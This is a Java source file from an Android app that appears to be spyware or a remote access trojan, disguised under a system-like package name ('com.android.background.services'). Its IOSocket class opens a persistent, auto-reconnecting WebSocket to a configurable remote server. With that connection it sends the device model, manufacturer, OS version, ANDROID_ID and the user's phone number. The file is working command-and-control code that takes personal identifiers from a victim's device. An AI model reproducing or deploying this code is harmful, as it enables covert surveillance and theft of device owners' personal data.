package com.android.background.services.socket;

import android.annotation.SuppressLint;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import com.android.background.services.helpers.SharedPrefHelper;
import com.android.background.services.managers.DeviceInfoManger;
import com.android.background.services.services.MainService;

import java.net.URISyntaxException;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.engineio.client.transports.WebSocket;

public class IOSocket {

    private static final String TAG = "MADARA";
    private static final IOSocket ourInstance = new IOSocket();
    private Socket ioSocket;

    private IOSocket() {

        try {
            @SuppressLint("HardwareIds")
            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 3600000;

            opts.transports = new String[]{WebSocket.NAME};

            String updatedHost = new SharedPrefHelper(MainService.getContextOfApplication()).getUpdatedHost();

            String query = "?model=" + Uri.encode(Build.MODEL)
                    + "&manufacture=" + Build.MANUFACTURER
                    + "&release=" + Build.VERSION.RELEASE
                    + "&id=" + deviceID
                    + "&phoneNumber=" + Uri.encode(DeviceInfoManger.getPhoneNumber(MainService.getContextOfApplication()));

            String finalServerHost = updatedHost + query;

            ioSocket = IO.socket(finalServerHost, opts); // Pass the options here

        } catch (URISyntaxException e) {
            Log.e(TAG, "IOSocket: ", e);
        }
    }

    public static IOSocket getInstance() {
        return ourInstance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }
}
